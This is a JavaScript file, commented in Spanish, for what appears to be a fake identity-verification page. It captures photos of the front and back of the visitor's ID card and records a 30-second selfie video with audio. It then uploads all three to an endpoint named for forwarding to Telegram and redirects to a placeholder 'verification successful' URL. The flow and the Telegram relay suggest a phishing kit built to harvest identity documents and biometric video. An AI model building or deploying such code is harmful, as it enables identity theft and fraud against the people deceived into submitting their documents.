document.addEventListener('DOMContentLoaded', () => {

    // --- Configuración ---
    const UPLOAD_URL = "/api/enviar-a-telegram"; 
    const SUCCESS_REDIRECT_URL = "https://tu-web.com/verificacion-exitosa.html";
    const RECORDING_SECONDS = 30;

    // --- Vistas ---
    const cameraView = document.getElementById('camera-view');
    const modalOverlay = document.getElementById('modal-overlay');
    const verifyingModal = document.getElementById('verifying-modal');
    
    // --- Elementos de la Cámara ---
    const videoPreview = document.getElementById('videoPreview');
    const status = document.getElementById('status');
    const countdownTimer = document.getElementById('countdown-timer');
    const captureButton = document.getElementById('capture-button');
    const toggleCameraButton = document.getElementById('toggle-camera-button');
    const photoCanvas = document.getElementById('photo-canvas');
    
    // --- Elementos del Modal ---
    const startVerificationButton = document.getElementById('start-verification-button');
    const modalContent = document.getElementById('modal-content'); 

    // --- Variables de Grabación y Estado ---
    let mediaRecorder;
    let streamLocal;
    let recordedChunks = [];
    let countdownInterval;

    // --- Variables de estado y datos ---
    let currentStep = 'WELCOME';
    let photoIdFront = null;
    let photoIdBack = null;
    let currentFacingMode = 'user'; // 'user' (frontal) o 'environment' (trasera)

    // --- 1. Iniciar/Reiniciar Cámara ---
    async function setupCamera(forceFacingMode = null) {
        status.textContent = "Iniciando cámara...";
        startVerificationButton.disabled = true;
        toggleCameraButton.disabled = true;

        // Detener la cámara actual si existe
        if (streamLocal) {
            streamLocal.getTracks().forEach(track => track.stop());
        }

        currentFacingMode = forceFacingMode || currentFacingMode;

        // Aplicar (o quitar) el estilo de espejo
        videoPreview.style.transform = (currentFacingMode === 'user') ? 'scaleX(-1)' : 'scaleX(1)';

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: currentFacingMode },
                audio: true // Pedir audio siempre, solo se usará en la grabación
            });
            streamLocal = stream;
            videoPreview.srcObject = stream;
            
            videoPreview.onloadedmetadata = () => {
                status.textContent = "Cámara lista.";
                startVerificationButton.disabled = false;
                toggleCameraButton.disabled = false;

                // Si ya estábamos en un paso de cámara, la mostramos
                if (currentStep !== 'WELCOME') {
                    cameraView.style.display = 'flex';
                }
                // Si estamos en un paso de foto, mostramos el botón de cambio
                if (currentStep === 'ID_FRONT' || currentStep === 'ID_BACK') {
                    toggleCameraButton.style.display = 'flex';
                }
                
                // Si cambiamos a 'VIDEO_SELFIE', iniciar grabación automáticamente
                if (currentStep === 'VIDEO_SELFIE' && currentFacingMode === 'user') {
                    startRecording();
                }
            };

        } catch (err) {
            console.error("Error al acceder a la cámara:", err);
            status.textContent = "Error: Permiso de cámara denegado.";
            modalContent.innerHTML = `
                <h2>Error de Cámara</h2>
                <p>No se pudo acceder a la cámara. Por favor, asegúrate de dar permisos en tu navegador y recarga la página.</p>
            `;
            modalOverlay.style.display = 'flex';
            cameraView.style.display = 'none';
            toggleCameraButton.style.display = 'none';
        }
    }

    // --- 2. Actualizar UI (Manejador de estado) ---
    function updateUIForStep() {
        // Ocultar todos los controles por defecto
        captureButton.style.display = 'none';
        toggleCameraButton.style.display = 'none';
        countdownTimer.style.display = 'none';

        switch (currentStep) {
            case 'ID_FRONT':
                modalOverlay.style.display = 'none';
                cameraView.style.display = 'flex';
                captureButton.style.display = 'block'; // Mostrar botón de captura
                toggleCameraButton.style.display = 'flex'; // Mostrar botón de cambio
                status.textContent = "Centra el FRENTE de tu documento";
                
                // Intentar cambiar a cámara trasera ('environment') para documentos
                if (currentFacingMode !== 'environment') {
                    setupCamera('environment');
                } else if (!streamLocal) {
                    setupCamera(); // Iniciar cámara si no lo está
                }
                break;
            
            case 'ID_BACK':
                // (La UI es casi idéntica a ID_FRONT)
                modalOverlay.style.display = 'none';
                cameraView.style.display = 'flex';
                captureButton.style.display = 'block';
                toggleCameraButton.style.display = 'flex';
                status.textContent = "Ahora, centra la parte TRASERA";
                // Debería seguir en 'environment'
                break;

            case 'VIDEO_SELFIE':
                modalOverlay.style.display = 'none';
                cameraView.style.display = 'flex';
                status.textContent = "Prepárate para el video selfie";
                
                // Forzar cámara frontal ('user') para el selfie
                if (currentFacingMode !== 'user') {
                    setupCamera('user');
                    // setupCamera llamará a startRecording cuando esté lista
                } else {
                    startRecording(); // Si ya está frontal, empezar a grabar
                }
                break;
            
            case 'UPLOADING':
                cameraView.style.display = 'none';
                verifyingModal.style.display = 'flex';
                if (streamLocal) {
                    streamLocal.getTracks().forEach(track => track.stop());
                    streamLocal = null; // Limpiar stream
                }
                break;
        }
    }

    // --- 3. Capturar Foto ---
    function capturePhoto() {
        photoCanvas.width = videoPreview.videoWidth;
        photoCanvas.height = videoPreview.videoHeight;
        
        const context = photoCanvas.getContext('2d');
        
        // Aplicar espejo solo si es cámara frontal
        if (currentFacingMode === 'user') {
            context.save();
            context.translate(photoCanvas.width, 0);
            context.scale(-1, 1);
            context.drawImage(videoPreview, 0, 0, photoCanvas.width, photoCanvas.height);
            context.restore();
        } else {
            // Dibujo normal para cámara trasera
            context.drawImage(videoPreview, 0, 0, photoCanvas.width, photoCanvas.height);
        }

        photoCanvas.toBlob((blob) => {
            if (currentStep === 'ID_FRONT') {
                photoIdFront = blob;
                console.log("Foto frontal capturada");
                currentStep = 'ID_BACK';
                updateUIForStep();
            } else if (currentStep === 'ID_BACK') {
                photoIdBack = blob;
                console.log("Foto trasera capturada");
                currentStep = 'VIDEO_SELFIE';
                updateUIForStep();
            }
        }, 'image/jpeg', 0.9);
    }

    // --- 4. Iniciar Grabación de Video ---
    function startRecording() {
        if (!streamLocal) {
            console.error("Intento de grabar sin stream de cámara.");
            return;
        }

        recordedChunks = [];
        mediaRecorder = new MediaRecorder(streamLocal, { mimeType: 'video/webm' });

        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        mediaRecorder.onstop = () => {
            currentStep = 'UPLOADING';
            updateUIForStep();
            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
            uploadAllData(videoBlob);
        };

        mediaRecorder.start();
        
        status.textContent = "Grabando... Mantente visible";
        countdownTimer.textContent = RECORDING_SECONDS;
        countdownTimer.style.display = 'block'; // Mostrar temporizador
        
        let secondsRemaining = RECORDING_SECONDS;
        
        countdownInterval = setInterval(() => {
            secondsRemaining--;
            countdownTimer.textContent = secondsRemaining;
            
            if (secondsRemaining <= 0) {
                stopRecording();
            }
        }, 1000); 
    }

    // --- 5. Detener Grabación ---
    function stopRecording() {
        clearInterval(countdownInterval); 
        countdownTimer.style.display = 'none'; 
        
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }
    }

    // --- 6. Subir TODOS los Datos ---
    async function uploadAllData(videoBlob) {
        const formData = new FormData();
        
        formData.append('idFront', photoIdFront, `id_front.jpg`);
        formData.append('idBack', photoIdBack, `id_back.jpg`);
        formData.append('video', videoBlob, `selfie.webm`);
        
        try {
            const response = await fetch(UPLOAD_URL, {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                console.log("Archivos enviados con éxito");
                window.location.href = SUCCESS_REDIRECT_URL;
            } else {
                const errorData = await response.json();
                console.error("Error del servidor:", errorData.error);
                throw new Error(`Error del servidor: ${errorData.error || response.statusText}`);
            }

        } catch (error) {
            console.error('Error al subir los archivos:', error.message);
            handleUploadError();
        }
    }

    // --- 7. Manejar Error de Subida ---
    function handleUploadError() {
        verifyingModal.style.display = 'none';
        modalOverlay.style.display = 'flex'; 
        modalContent.querySelector('h2').textContent = 'Error de Subida';
        modalContent.querySelector('p').textContent = 'No pudimos verificar tus archivos. Por favor, inténtalo de nuevo.';
        
        // Reseteamos el estado para un nuevo intento
        currentStep = 'WELCOME';
        photoIdFront = null;
        photoIdBack = null;
        streamLocal = null; 
        currentFacingMode = 'user'; // Resetear a cámara frontal
        setupCamera(); // Preparar la cámara de nuevo
    }
    
    // --- Asignar Eventos ---
    
    startVerificationButton.onclick = () => {
        currentStep = 'ID_FRONT';
        updateUIForStep();
    };

    captureButton.onclick = capturePhoto;

    toggleCameraButton.onclick = () => {
        currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
        console.log("Cambiando cámara a:", currentFacingMode);
        setupCamera(currentFacingMode); // Reiniciar la cámara con el nuevo modo
    };

    // --- Iniciar ---
    // Iniciar la cámara en segundo plano
    setupCamera();
});